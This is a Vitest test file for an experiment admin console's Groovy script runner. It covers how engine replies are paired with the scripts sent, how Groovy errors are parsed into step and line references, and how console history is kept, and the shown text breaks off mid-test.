import { describe, it, expect, vi, beforeEach } from 'vitest'
import { defineComponent, h, nextTick } from 'vue'
import { mount, flushPromises } from '@vue/test-utils'
import { EditorView } from '@codemirror/view'
import { EditorState } from '@codemirror/state'

// The store as the console sees it: a reactive admin with an output log, and actions that log
// what was run (runScript writes the script as an "input" line and returns its request id, like the
// real store).
vi.mock('@/store/admin', async () => {
  const { reactive, ref, computed } = await import('vue')
  let seq = 100
  let requestSeq = 0
  const admin = reactive({
    email: 'r@lab.org',
    user: { email: 'r@lab.org', currentScript: 'g.V.count()', experiments: [], defaultLanguage: null } as any,
    experiment: { id: 1, name: 'Trust game', fileMode: false } as any,
    instance: null as any,
    engine: 'ready',
    output: [] as any[],
  })
  const push = (kind: string, text: string, source?: string, requestId?: string, extra?: Record<string, unknown>) => {
    admin.output.push({ id: ++seq, kind, text, source, at: Date.now(), ...(requestId ? { requestId } : {}), ...(extra || {}) })
  }
  const actions = {
    runScript: vi.fn((script: string): string | null => { push('input', script); return `req-${++requestSeq}` }),
    runStep: vi.fn(),
    refresh: vi.fn(() => Promise.resolve(null)),
    markEngineStale: vi.fn(),
    reloadEngine: vi.fn(),
    selectExperiment: vi.fn(),
  }
  return {
    admin,
    actions,
    ensureConnected: vi.fn(() => true),
    __push: push,
    running: computed(() => false),
    connectionState: ref('open'),
    // what the engine runs when that is another experiment than the selected one
    engineElsewhere: ref(null),
    graph: { nodes: new Map([['3', { id: '3', data: {} }], ['_1', { id: '_1', data: {} }], ['8', { id: '8', data: {} }]]), version: ref(0) },
  }
})

// the Steps page, where a line of a step's code named in an error opens
const routerPush = vi.hoisted(() => vi.fn())
vi.mock('vue-router', async (orig) => ({
  ...(await orig<any>()),
  useRoute: () => ({ query: {} }),
  useRouter: () => ({ replace: vi.fn(), push: routerPush }),
}))

import * as store from '@/store/admin'

// Node's own (file-less) localStorage shadows jsdom's here; use a plain in-memory one.
const memory = new Map<string, string>()
vi.stubGlobal('localStorage', {
  getItem: (k: string) => memory.has(k) ? memory.get(k)! : null,
  setItem: (k: string, v: string) => { memory.set(k, String(v)) },
  removeItem: (k: string) => { memory.delete(k) },
  clear: () => memory.clear(),
})
import {
  echoPrefix, expectReply, lastOutputId, matchReply, showsTags, splitValues, __resetReplies,
} from '../src/pages/console/engineReplies'
import { failureWhere, parseGroovyError, humanType, placeLabel, readBrief } from '../src/pages/console/groovyError'
import EngineError from '../src/pages/console/EngineError.vue'
import {
  addToHistory, consoleState, initialBuffer, markHistory, runConsoleScript, sanitizeHistory, searchHistory, seedConsole,
  HISTORY_CAP, type HistoryItem,
} from '../src/pages/console/consoleState'
import { SNIPPETS, SNIPPET_GROUPS, fillSnippet, pickIds, searchSnippets } from '../src/pages/console/snippets'
import { insertBlock, selectionOf, goToLine } from '../src/pages/console/editorView'
import ConsolePage from '../src/pages/console/ConsolePage.vue'

const admin = store.admin as any
const actions = store.actions as any
const push = (store as any).__push as (kind: string, text: string, source?: string, requestId?: string, extra?: Record<string, unknown>) => void

beforeEach(() => {
  __resetReplies()
  vi.clearAllMocks()
})

describe('engine replies', () => {
  it('reads the values out of a success frame for its own script', () => {
    expect(splitValues('g.V.count()\n\n==>3', 'g.V.count()')).toEqual(['3'])
    expect(splitValues('g.V.id\n\n==>1\n==>2\n==>_1', '  g.V.id\n')).toEqual(['1', '2', '_1'])
    // a null result leaves nothing after ==>
    expect(splitValues('x = 1; null\n\n==>', 'x = 1; null')).toEqual([])
    expect(splitValues('g.E.count()\n\n==>4', 'g.V.count()')).toBeNull()
    expect(echoPrefix('  a\n')).toBe('a\n\n==>')
  })

  it('matches a success by its echo and an error to the oldest waiting script', () => {
    const waiting = [{ script: 'a()', afterId: 10 }, { script: 'b()', afterId: 11 }]
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'b()\n\n==>2' })).toBe(1)
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'onJoinStep.start("p1")\n\n==>' })).toBe(-1)
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: boom' })).toBe(0)
    // nothing that came before the script was sent
    expect(matchReply(waiting, { id: 9, kind: 'error', text: 'Caught error: old' })).toBe(-1)
    expect(matchReply(waiting, { id: 13, kind: 'info', text: 'x' })).toBe(-1)
  })

  it('never takes the refusal of another request as the answer', () => {
    const waiting = [{ script: 'a()', afterId: 10 }]
    for (const source of ['LaunchGame', 'DeleteInstance', 'SelectExperiment', 'OnJoinStep', 'OnLeaveStep']) {
      expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: not mine', source })).toBe(-1)
    }
    // a refused SendScript, or a RunStep (which the server names SendStep), is still an answer
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'You are not signed in.', source: 'SendScript' })).toBe(0)
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Something went wrong', source: 'SendStep' })).toBe(0)
  })

  it('pairs a tagged answer only with a script sent with the same request', () => {
    const waiting = [{ script: 'a()', afterId: 10, request: 'SendScript' as const }, { script: 'a()', afterId: 11, request: 'SendStep' as const }]
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: boom', source: 'SendStep' })).toBe(1)
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: boom', source: 'SendScript' })).toBe(0)
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'a()\n\n==>1', source: 'SendStep' })).toBe(1)
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'a()\n\n==>1', source: 'SendScript' })).toBe(0)
    // the echo still has to match
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'b()\n\n==>1', source: 'SendStep' })).toBe(-1)
    // frames of OnJoin/OnLeave and of the steps loading are never an answer, whatever they say
    for (const source of ['OnJoinStep', 'OnLeaveStep', 'Steps', 'RunGame']) {
      expect(matchReply(waiting, { id: 12, kind: 'output', text: 'a()\n\n==>1', source })).toBe(-1)
    }
  })

  it('pairs an answer that names its request id with the script sent with it, wherever it stands in line', () => {
    const waiting = [
      { script: 'a()', afterId: 10, request: 'SendScript' as const, requestId: 'r1' },
      { script: 'b()', afterId: 11, request: 'SendStep' as const, requestId: 'r2' },
    ]
    // the second script's error, though the first is older
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: boom', source: 'SendStep', requestId: 'r2' })).toBe(1)
    // a refusal is an answer too
    const refusal = 'Nothing was run: the engine has another experiment loaded now. Reload the page and try again.'
    expect(matchReply(waiting, { id: 12, kind: 'error', text: refusal, source: 'SendScript', requestId: 'r1' })).toBe(0)
    // also when the server tags its answers and the echo is not the script's
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'x\n\n==>1', source: 'SendStep', requestId: 'r2' }, true)).toBe(1)
    // an id no waiting script was sent with answers none of them
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: late', source: 'SendScript', requestId: 'r0' })).toBe(-1)
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'a()\n\n==>1', source: 'SendScript', requestId: 'r0' })).toBe(-1)
    // ... except a script waiting without an id, by its place in line
    expect(matchReply([{ script: 'a()', afterId: 10 }], { id: 12, kind: 'error', text: 'Caught error: x', source: 'SendScript', requestId: 'r0' })).toBe(0)
    // an older server echoes no id: the place in line decides, as before
    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: boom', source: 'SendScript' })).toBe(0)
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'b()\n\n==>2', source: 'SendStep' })).toBe(1)
  })

  it('does not take a slow script\'s late answer for the next script\'s, once the server echoes ids', async () => {
    vi.useFakeTimers()
    push('input', 'slow()')
    const slow = expectReply('slow()', lastOutputId(), { request: 'SendScript', requestId: 'r-slow' }, 1000)
    push('input', 'next()')
    const next = expectReply('next()', lastOutputId(), { request: 'SendScript', requestId: 'r-next' }, 5000)
    // next() fails first, then slow() answers
    push('error', 'Caught error: next failed', 'SendScript', 'r-next')
    await nextTick()
    push('output', 'slow()\n\n==>1', 'SendScript', 'r-slow')
    await nextTick()
    expect(await next).toMatchObject({ ok: false, error: 'Caught error: next failed' })
    expect(await slow).toMatchObject({ ok: true, values: ['1'] })
    vi.useRealTimers()
  })

  it('takes untagged frames as answers only from a server that tags nothing', () => {
    const waiting = [{ script: 'a()', afterId: 10, request: 'SendScript' as const }]
    const untagged = { id: 12, kind: 'error' as const, text: 'Caught error: initStep started already' }
    expect(matchReply(waiting, untagged)).toBe(0)
    expect(matchReply(waiting, untagged, true)).toBe(-1)
    expect(matchReply(waiting, { id: 12, kind: 'output', text: 'a()\n\n==>1' }, true)).toBe(-1)
  })

  it('tells a server that tags its answers by its frames', () => {
    expect(showsTags({ kind: 'output', text: 'a()\n\n==>1', source: 'SendScript' })).toBe(true)
    expect(showsTags({ kind: 'error', text: 'Caught error: boom', source: 'SendStep' })).toBe(true)
    expect(showsTags({ kind: 'error', text: 'Caught error: boom', source: 'OnJoinStep' })).toBe(true)
    expect(showsTags({ kind: 'output', text: 'x\n\n==>', source: 'Steps' })).toBe(true)
    // refusals were tagged before the answers were
    expect(showsTags({ kind: 'error', text: 'You are not signed in.', source: 'SendScript' })).toBe(false)
    expect(showsTags({ kind: 'error', text: 'Could not delete the session.', source: 'DeleteInstance' })).toBe(false)
    expect(showsTags({ kind: 'error', text: 'Caught error: boom' })).toBe(false)
    expect(showsTags({ kind: 'input', text: 'a()', source: 'console' })).toBe(false)
  })

  it('ignores untagged errors once the server has shown that it tags its answers', async () => {
    push('output', 'x = 1\n\n==>', 'Steps')
    push('input', 'g.V.count()')
    const p = expectReply('g.V.count()', lastOutputId(), 'SendScript')
    // e.g. the AMT timer starting the game
    push('error', 'Caught error: initStep started already')
    push('error', 'Caught error: boom', 'OnJoinStep')
    await nextTick()
    push('output', 'g.V.count()\n\n==>4', 'SendScript')
    await nextTick()
    expect(await p).toMatchObject({ ok: true, values: ['4'] })
  })

  it('still takes an untagged error as the answer from an older server', async () => {
    push('input', 'boom()')
    const p = expectReply('boom()', lastOutputId(), 'SendScript')
    push('error', 'Caught error: boom')
    await nextTick()
    expect(await p).toMatchObject({ ok: false, error: 'Caught error: boom' })
  })

  it('waits past an unrelated error for its own answer', async () => {
    push('input', 'g.V.count()')
    const p = expectReply('g.V.count()', lastOutputId())
    push('error', 'Could not delete the session.', 'DeleteInstance')
    push('output', 'g.V.count()\n\n==>7')
    await nextTick()
    expect(await p).toMatchObject({ ok: true, values: ['7'], error: null })
  })

  it('resolves with the answer as it arrives in the output', async () => {
    push('input', 'g.V.count()')
    const p = expectReply('g.V.count()', lastOutputId())
    push('output', 'onJoinStep.start("9")\n\n==>')
    push('output', 'g.V.count()\n\n==>5')
    await nextTick()
    const r = await p
    expect(r).toMatchObject({ ok: true, values: ['5'], error: null })
  })

  it('gives up after the timeout', async () => {
    vi.useFakeTimers()
    const p = expectReply('slow()', lastOutputId(), undefined, 1000)
    vi.advanceTimersByTime(1001)
    expect(await p).toBeNull()
    vi.useRealTimers()
  })

  it('keeps a script that timed out in line, so its late error is not taken for the next script', async () => {
    vi.useFakeTimers()
    push('input', 'slow()')
    const slow = expectReply('slow()', lastOutputId(), 'SendScript', 1000)
    vi.advanceTimersByTime(1001)
    expect(await slow).toBeNull()
    push('input', 'next()')
    const next = expectReply('next()', lastOutputId(), 'SendScript', 1000)
    // slow() fails at last, then next() does
    push('error', 'Caught error: slow failed', 'SendScript')
    await nextTick()
    push('error', 'Caught error: next failed', 'SendScript')
    await nextTick()
    expect(await next).toMatchObject({ ok: false, error: 'Caught error: next failed' })
    vi.useRealTimers()
  })

  it('answers every waiting script with null when the connection drops (their answers never come)', async () => {
    const conn = (store as any).connectionState
    push('input', 'a()')
    const a = expectReply('a()', lastOutputId(), 'SendScript')
    conn.value = 'retrying'
    expect(await a).toBeNull()
    conn.value = 'open'
    // the next run gets its own error, not a()'s place in line
    push('input', 'b()')
    const b = expectReply('b()', lastOutputId(), 'SendScript')
    push('error', 'Caught error: b failed', 'SendScript')
    await nextTick()
    expect(await b).toMatchObject({ ok: false, error: 'Caught error: b failed' })
  })

  it('still takes an answer that arrived just before the connection dropped', async () => {
    const conn = (store as any).connectionState
    push('input', 'g.V.count()')
    const p = expectReply('g.V.count()', lastOutputId(), 'SendScript')
    push('output', 'g.V.count()\n\n==>3', 'SendScript')
    conn.value = 'closed'
    conn.value = 'open'
    expect(await p).toMatchObject({ ok: true, values: ['3'] })
  })
})

describe('engine errors', () => {
  it('explains an unknown name and finds the line in the script that was run', () => {
    const e = parseGroovyError('Caught error: ScriptException: groovy.lang.MissingPropertyException: No such property: foo for class: Script12\n  at Script5.groovy:9\n  at graph.groovy:120\n  at Script12.groovy:3')
    expect(e.type).toBe('MissingPropertyException')
    expect(e.title).toBe('Unknown name “foo”')
    expect(e.message).toBe('No such property: foo for class: Script12')
    expect(e.places[0]).toEqual({ file: 'Script12.groovy', line: 3, kind: 'own' })
    expect(e.places.map(p => p.kind)).toEqual(['own', 'library', 'other'])
  })

  it('finds a failing step\'s own line in its innermost script, also when a newer step started it', () => {
    // FinishStep (Script680: steps load in name order) fails at its line 5; RoundStep (Script684) started it at line 82
    const raw = 'Caught error: IllegalStateException: FinishStep fails\n  at Script680.groovy:5\n  at step.groovy:64\n  at step.groovy:-1\n' +
      '  at Script684.groovy:82\n  at step.groovy:200\n  at step.groovy:160\n  at actions.groovy:330\n  at timer.groovy:76\n'
    const e = parseGroovyError(raw, { inStep: true })
    expect(e.title).toBe('FinishStep fails')
    expect(e.places.filter(p => p.kind !== 'library')).toEqual([
      { file: 'Script680.groovy', line: 5, kind: 'own' },
      { file: 'Script684.groovy', line: 82, kind: 'other' },
    ])
    // every line of the step's own script, innermost first (a closure inside its run), and its own line when
    // one of Breadboard's files threw
    const inner = parseGroovyError('Caught error: MissingPropertyException: No such property: scroe for class: Script680\n' +
      '  at Script680.groovy:9\n  at Script680.groovy:5\n  at step.groovy:64\n  at Script684.groovy:82', { inStep: true })
    expect(inner.places.filter(p => p.kind === 'own').map(p => p.line)).toEqual([9, 5])
    const lib = parseGroovyError('Caught error: IllegalStateException: They are already connected.\n  at edge_edits.groovy:108\n' +
      '  at Script680.groovy:7\n  at step.groovy:64\n  at Script684.groovy:82', { inStep: true })
    expect(lib.places[0]).toEqual({ file: 'Script680.groovy', line: 7, kind: 'own' })
    // InitStep failing at its line 47, started by the OnJoinStep (its line 5) in the script the server runs for a
    // newcomer, onJoinStep.start("c1"), the newest; and started by the waiting room's initStep.start() (as sent)
    const join = parseGroovyError('Caught error: ScriptException: javax.script.ScriptException: java.lang.IllegalStateException: InitStep fails\n' +
      '  at Script201.groovy:47\n  at step.groovy:64\n  at step.groovy:-1\n  at Script202.groovy:5\n  at Script205.groovy:1\n', { inStep: true })
    expect(join.places.filter(p => p.kind !== 'library')).toEqual([
      { file: 'Script201.groovy', line: 47, kind: 'own' },
      { file: 'Script202.groovy', line: 5, kind: 'other' },
      { file: 'Script205.groovy', line: 1, kind: 'other' },
    ])
    const room = parseGroovyError('Caught error: IllegalStateException: InitStep fails\n  at Script243.groovy:47\n  at step.groovy:64\n' +
      '  at step.groovy:-1\n  at Script249.groovy:1\n  at autopilot.groovy:621\n  at autopilot.groovy:-1\n  at autopilot.groovy:420\n', { inStep: true })
    expect(room.places[0]).toEqual({ file: 'Script243.groovy', line: 47, kind: 'own' })
    // a script run from the console is still the newest one
    expect(parseGroovyError(raw).places[0]).toEqual({ file: 'Script684.groovy', line: 82, kind: 'own' })
  })

  it('keeps a frame without a line (a closure in Breadboard\'s own code) out of the message, as the others', () => {
    const raw = 'Caught error: MissingPropertyException: No such property: roundNoteText for class: Script53\n at Script53.groovy:76\n at step.groovy:200\n at step.groovy:-1\n at step.groovy:160'
    const e = parseGroovyError(raw)
    expect(e.message).toBe('No such property: roundNoteText for class: Script53')
    expect(e.places.map(p => `${p.file}:${p.line}`)).toEqual(['Script53.groovy:76', 'step.groovy:200', 'step.groovy:160'])
    // all of it under Full error
    expect(e.raw).toContain('at step.groovy:-1')
  })

  it('reads a syntax error with its line and column', () => {
    const e = parseGroovyError('Caught error: ScriptException: org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed:\nScript7.groovy: 2: unexpected token: ) @ line 2, column 12.\n   g.V.count())\n              ^\n\n1 error\n')
    expect(e.title).toBe('Syntax error')
    expect(e.message).toBe('unexpected token: )')
    expect(e.places[0]).toEqual({ file: 'Script7.groovy', line: 2, column: 12, kind: 'own' })
  })

  it('says plainly that the game already started', () => {
    const e = parseGroovyError('Caught error: initStep started already')
    expect(e.title).toBe('The game has already started')
    expect(e.hint).toMatch(/once per engine load/)
    expect(e.places).toEqual([])
  })

  it('explains the brief compiler messages kept in an autopilot load failure', () => {
    for (const brief of ['unexpected token: ;', 'unexpected char: @', 'unable to resolve class MissingType', 'expecting EOF, found )']) {
      const e = parseGroovyError(brief)
      expect(e.title).toBe('Syntax error')
      expect(e.hint).toContain('Check the brackets')
      expect(e.message).toBe(brief)
    }
    expect(parseGroovyError('No such property: five').title).toBe('Unknown name “five”')
  })

  it('passes Breadboard\'s own refusals through as they are written', () => {
    const e = parseGroovyError('Caught error: ScriptException: java.lang.IllegalStateException: They are already connected.\n  at edge_edits.groovy:108\n  at Script30.groovy:1')
    expect(e.title).toBe('They are already connected.')
    expect(e.places[0]).toMatchObject({ file: 'Script30.groovy', kind: 'own' })
    expect(e.places[1]).toMatchObject({ file: 'edge_edits.groovy', kind: 'library' })
  })

  it('copes with a bare exception and odd input', () => {
    expect(parseGroovyError('Caught error: NullPointerException').title).toBe('Something was empty (null)')
    expect(parseGroovyError('').title).toBe('The script failed')
    expect(humanType('NumberFormatException')).toBe('Number format exception')
  })
})

// The network game's steps, as the server names them (the "frames" beside an error's text): they load in name order,
// so FinishStep is Script530, InitStep Script531, RoundStep Script534. InitStep defines isHuman, which RoundStep and
// FinishStep call.
describe('engine errors the server names by step', () => {
  const kinds = (e: ReturnType<typeof parseGroovyError>) => e.places.filter(p => p.kind !== 'library').map(p => `${p.kind}: ${placeLabel(p)}`)

  it('names the failing step\'s own line where it went wrong in its own code', () => {
    // RoundStep's done, on its timer, at its line 66 (in its g.V.each at line 64)
    const e = parseGroovyError('Caught error: MissingPropertyException: No such property: pickz for class: Script534\n' +
      '  at Script534.groovy:66\n  at Script534.groovy:64\n  at step.groovy:200\n  at step.groovy:-1\n  at step.groovy:167\n', {
      inStep: true,
      frames: [{ file: 'Script534.groovy', line: 66, step: 'RoundStep', own: true }, { file: 'Script534.groovy', line: 64, step: 'RoundStep' }],
    })
    expect(e.title).toBe('Unknown name “pickz”')
    expect(kinds(e)).toEqual(['own: Line 66', 'own: Line 64'])
    expect(e.places[0]).toEqual({ file: 'Script534.groovy', line: 66, kind: 'own', step: 'RoundStep', primary: true })
  })

  it('names the failing step\'s own line, and where it went wrong in another step\'s function it called', () => {
    // RoundStep's line 14 (in its g.V.each at line 12) calls InitStep's isHuman, which throws at InitStep's line 65;
    // RoundStep's done at line 80 had started the round (as sent)
    const raw = 'Caught error: IllegalStateException: isHumanStrict fails\n  at Script531.groovy:65\n  at Script534.groovy:14\n' +
      '  at Script534.groovy:12\n  at step.groovy:64\n  at step.groovy:-1\n  at Script534.groovy:80\n  at step.groovy:200\n  at timer.groovy:76\n'
    const frames = [
      { file: 'Script531.groovy', line: 65, step: 'InitStep', name: 'isHuman' },
      { file: 'Script534.groovy', line: 14, step: 'RoundStep', own: true },
      { file: 'Script534.groovy', line: 12, step: 'RoundStep' },
      { file: 'Script534.groovy', line: 80, step: 'RoundStep' },
    ]
    const e = parseGroovyError(raw, { inStep: true, frames })
    expect(e.title).toBe('isHumanStrict fails')
    expect(kinds(e)).toEqual(['own: Line 14', 'in: in isHuman (InitStep line 65)', 'own: Line 12', 'own: Line 80'])
    expect(e.places[0]).toEqual({ file: 'Script534.groovy', line: 14, kind: 'own', step: 'RoundStep', primary: true })
    expect(e.places[1]).toEqual({ file: 'Script531.groovy', line: 65, kind: 'in', step: 'InitStep', name: 'isHuman' })
    // without the function's name, the step and line
    expect(kinds(parseGroovyError(raw, { inStep: true, frames: [{ ...frames[0], name: undefined }, ...frames.slice(1)] }))[1])
      .toBe('in: in InitStep line 65')
    // An older message, without the names: the guess from the text, InitStep's line taken for RoundStep's
    expect(parseGroovyError(raw, { inStep: true }).places[0]).toEqual({ file: 'Script531.groovy', line: 65, kind: 'own' })
  })

  it('names a step another step started, InitStep the waiting room started, and a step that failed as it loaded', () => {
    // FinishStep failing at its line 5, started by RoundStep's finishStep.start() at its line 82
    const finish = parseGroovyError('Caught error: IllegalStateException: FinishStep fails\n  at Script530.groovy:5\n  at step.groovy:64\n' +
      '  at step.groovy:-1\n  at Script534.groovy:82\n  at step.groovy:200\n', {
      inStep: true,
      frames: [{ file: 'Script530.groovy', line: 5, step: 'FinishStep', own: true }, { file: 'Script534.groovy', line: 82, step: 'RoundStep' }],
    })
    expect(kinds(finish)).toEqual(['own: Line 5', 'other: RoundStep line 82'])
    expect(finish.places[0].step).toBe('FinishStep')
    // InitStep failing at its line 47 as the waiting room's initStep.start() (Script900, no step's) started the game
    const room = parseGroovyError('Caught error: IllegalStateException: InitStep fails\n  at Script531.groovy:47\n  at step.groovy:64\n' +
      '  at step.groovy:-1\n  at Script900.groovy:1\n  at autopilot.groovy:621\n', {
      inStep: true,
      frames: [{ file: 'Script531.groovy', line: 47, step: 'InitStep', own: true }, { file: 'Script900.groovy', line: 1 }],
    })
    expect(kinds(room)).toEqual(['own: Line 47', 'other: Script900.groovy, line 1'])
    // RoundStep failing as it loads, at its line 2, where it calls isHuman; and a syntax error in its line 3, in the
    // class the compiler gave the code that didn't compile
    const loads = parseGroovyError('Caught error: ScriptException: java.lang.IllegalStateException: isHuman fails for p1\n' +
      '  at Script531.groovy:6\n  at Script534.groovy:2\n', {
      inStep: true,
      frames: [{ file: 'Script531.groovy', line: 6, step: 'InitStep', name: 'isHuman' }, { file: 'Script534.groovy', line: 2, step: 'RoundStep', own: true }],
    })
    expect(kinds(loads)).toEqual(['own: Line 2', 'in: in isHuman (InitStep line 6)'])
    const syntax = parseGroovyError('Caught error: ScriptException: org.codehaus.groovy.control.MultipleCompilationErrorsException: ' +
      'startup failed:\nScript600.groovy: 3: unexpected token: } @ line 3, column 1.\n   }\n   ^\n\n1 error\n', {
      inStep: true,
      frames: [{ file: 'Script600.groovy', line: 3, step: 'RoundStep', own: true }],
    })
    expect(syntax.title).toBe('Syntax error')
    expect(syntax.places).toEqual([{ file: 'Script600.groovy', line: 3, column: 1, kind: 'own', step: 'RoundStep', primary: true }])
  })

  it('keeps the script that was run as its own on the Script console and the Steps page, and names the rest by step', () => {
    // the Script console ran roundStep.start() (Script950, its own), and RoundStep failed at its line 71
    const typed = parseGroovyError('Caught error: MissingPropertyException: No such property: x for class: Script534\n' +
      '  at Script534.groovy:71\n  at step.groovy:64\n  at Script950.groovy:1\n', {
      frames: [{ file: 'Script534.groovy', line: 71, step: 'RoundStep', own: true }, { file: 'Script950.groovy', line: 1 }],
    })
    expect(kinds(typed)).toEqual(['own: Line 1', 'other: RoundStep line 71'])
    // the Steps page ran RoundStep's code again (Script960), which called isHuman at its line 3
    const run = parseGroovyError('Caught error: IllegalStateException: isHuman fails for p2\n  at Script531.groovy:6\n  at Script960.groovy:3\n', {
      frames: [{ file: 'Script531.groovy', line: 6, step: 'InitStep', name: 'isHuman' }, { file: 'Script960.groovy', line: 3, step: 'RoundStep', own: true }],
    })
    expect(kinds(run)).toEqual(['own: Line 3', 'in: in isHuman (InitStep line 6)'])
  })

  it('reads where the server\'s brief words say a step failed', () => {
    expect(readBrief('line 71: No such property: x')).toEqual({ line: 71, in: null, message: 'No such property: x' })
    expect(readBrief('line 14, in isHuman (InitStep line 30): isHumanStrict fails: a: b')).toEqual({
      line: 14, in: { step: 'InitStep', line: 30, name: 'isHuman' }, message: 'isHumanStrict fails: a: b',
    })
    expect(readBrief('line 14, in Init Step line 30: boom')).toEqual({ line: 14, in: { step: 'Init Step', line: 30, name: null }, message: 'boom' })
    // the failing step's own line unknown: the innermost line, which is another step's
    expect(readBrief('line 30 of InitStep: boom')).toEqual({ line: null, in: { step: 'InitStep', line: 30, name: null }, message: 'boom' })
    expect(readBrief('boom (no line)')).toEqual({ line: null, in: null, message: 'boom (no line)' })
    // the data: stepFailed's error, and sessionFailed's line and error
    expect(failureWhere({ step: 'RoundStep', error: 'line 14, in isHuman (InitStep line 30): boom' }))
      .toEqual({ line: 14, in: { step: 'InitStep', line: 30, name: 'isHuman' } })
    expect(failureWhere({ step: 'RoundStep', line: '14', error: 'in isHuman (InitStep line 30): boom' }))
      .toEqual({ line: 14, in: { step: 'InitStep', line: 30, name: 'isHuman' } })
    expect(failureWhere({ step: 'RoundStep', line: '71', error: 'No such property: x' })).toEqual({ line: 71, in: null })
  })

  it('opens each line where it is: the failing step\'s, and the step whose function it called', async () => {
    const raw = 'Caught error: IllegalStateException: isHumanStrict fails\n  at Script531.groovy:65\n  at Script534.groovy:14\n  at step.groovy:64\n' +
      '  at Script534.groovy:80\n  at Script900.groovy:1\n'
    const frames = [
      { file: 'Script531.groovy', line: 65, step: 'InitStep', name: 'isHuman' },
      { file: 'Script534.groovy', line: 14, step: 'RoundStep', own: true },
      { file: 'Script534.groovy', line: 80, step: 'RoundStep' },
      { file: 'Script900.groovy', line: 1 },
    ]
    // as Live session shows it: no step of its own, every line named by its step
    const w = mount(EngineError, { props: { error: raw, frames, ownName: 'roundStep', fromLine: 1, inStep: true } })
    expect(w.findAll('.eng-err__places li').map(li => li.text())).toEqual([
      'Line 14 of RoundStep', 'in isHuman (InitStep line 65)', 'Line 80 of RoundStep',
    ])
    const links = w.findAll('button.eng-err__place')
    expect(links).toHaveLength(3)
    for (const b of links) await b.trigger('click')
    expect(w.emitted('goto')).toEqual([[14, undefined, 'RoundStep'], [65, undefined, 'InitStep'], [80, undefined, 'RoundStep']])
    // as the Steps page shows a run of RoundStep's code (Script960, the newest), which called isHuman at its line 3:
    // "this step", in its editor, and InitStep's line where it went wrong
    const page = mount(EngineError, {
      props: {
        error: 'Caught error: IllegalStateException: isHuman fails for p2\n  at Script531.groovy:6\n  at Script960.groovy:3\n',
        frames: [{ file: 'Script531.groovy', line: 6, step: 'InitStep', name: 'isHuman' }, { file: 'Script960.groovy', line: 3, step: 'RoundStep', own: true }],
        ownName: 'this step',
        ownStep: 'RoundStep',
        fromLine: 1,
      },
    })
    expect(page.findAll('.eng-err__places li').map(li => li.text())).toEqual(['Line 3 of this step', 'in isHuman (InitStep line 6)'])
    for (const b of page.findAll('button.eng-err__place')) await b.trigger('click')
    expect(page.emitted('goto')).toEqual([[3, undefined, undefined], [6, undefined, 'InitStep']])
    // a line of a step's code is that step's line, never moved by where the script run from the editor began
    const shifted = mount(EngineError, {
      props: {
        error: 'Caught error: boom\n  at Script534.groovy:71\n  at Script500.groovy:1\n',
        frames: [{ file: 'Script534.groovy', line: 71, step: 'RoundStep', own: true }, { file: 'Script500.groovy', line: 1 }],
        ownName: 'your script',
        fromLine: 5,
      },
    })
    expect(shifted.findAll('.eng-err__places li').map(li => li.text())[0]).toBe('Line 71 of RoundStep')
    await shifted.find('button.eng-err__place').trigger('click')
    expect(shifted.emitted('goto')![0]).toEqual([71, undefined, 'RoundStep'])
    // an older message: as before
    const old = mount(EngineError, { props: { error: raw, ownName: 'RoundStep', fromLine: 1, inStep: true } })
    expect(old.findAll('.eng-err__places li').map(li => li.text())[0]).toBe('Line 65 of RoundStep')
    expect(old.findAll('.eng-err__places li').map(li => li.text())).toEqual(['Line 65 of RoundStep'])
    expect(old.find('.eng-err__raw pre').text()).toContain('Script534.groovy')
  })
})

describe('history and the buffer', () => {
  it('keeps the newest run on top and counts repeats once', () => {
    let list: HistoryItem[] = []
    list = addToHistory(list, 'a()', 1)
    list = addToHistory(list, 'b()', 2)
    list = addToHistory(list, ' a() ', 3)
    expect(list.map(h => h.script)).toEqual([' a() ', 'b()'])
    expect(list[0].count).toBe(2)
    markHistory(list, 'a()', false)
    expect(list[0].ok).toBe(false)
    expect(searchHistory(list, 'B(')).toHaveLength(1)
  })

  it('caps the history', () => {
    let list: HistoryItem[] = []
    for (let i = 0; i < HISTORY_CAP + 20; i++) list = addToHistory(list, `s${i}()`, i)
    expect(list).toHaveLength(HISTORY_CAP)
    expect(list[0].script).toBe(`s${HISTORY_CAP + 19}()`)
  })

  it('drops broken entries read back from storage', () => {
    expect(sanitizeHistory('nope')).toEqual([])
    expect(sanitizeHistory([{ script: 'x()', at: 5, count: 2, ok: true }, { script: '' }, null, { at: 1 }]))
      .toEqual([{ script: 'x()', at: 5, count: 2, ok: true }])
  })

  it('starts from this browser\'s draft, else the server\'s copy', () => {
    expect(initialBuffer('mine', 'server')).toBe('mine')
    expect(initialBuffer('', 'server')).toBe('')
    expect(initialBuffer(null, 'server')).toBe('server')
    expect(initialBuffer(null, undefined)).toBe('')
  })

  it('seeds once per account and is never replaced afterwards', () => {
    localStorage.setItem('bb-console-draft:a@x.org', 'draft()')
    seedConsole('a@x.org', 'server()')
    expect(consoleState.buffer).toBe('draft()')
    consoleState.buffer = 'typing…'
    seedConsole('a@x.org', 'pushed()')
    expect(consoleState.buffer).toBe('typing…')
    seedConsole('b@x.org', 'theirs()')
    expect(consoleState.buffer).toBe('theirs()')
  })

  it('shows the refusal of a script the engine did not run, as the run\'s error', async () => {
    seedConsole('refused@x.org', '')
    const run = runConsoleScript('g.V.count()', { label: 'Script', fromLine: 1 })!
    const id = actions.runScript.mock.results[0].value
    expect(id).toMatch(/^req-/)
    const refusal = 'Nothing was run: the engine has another experiment loaded now. Reload the page and try again.'
    // another script's answer comes first: not this run's
    push('error', 'Caught error: someone else', 'SendScript', 'req-elsewhere')
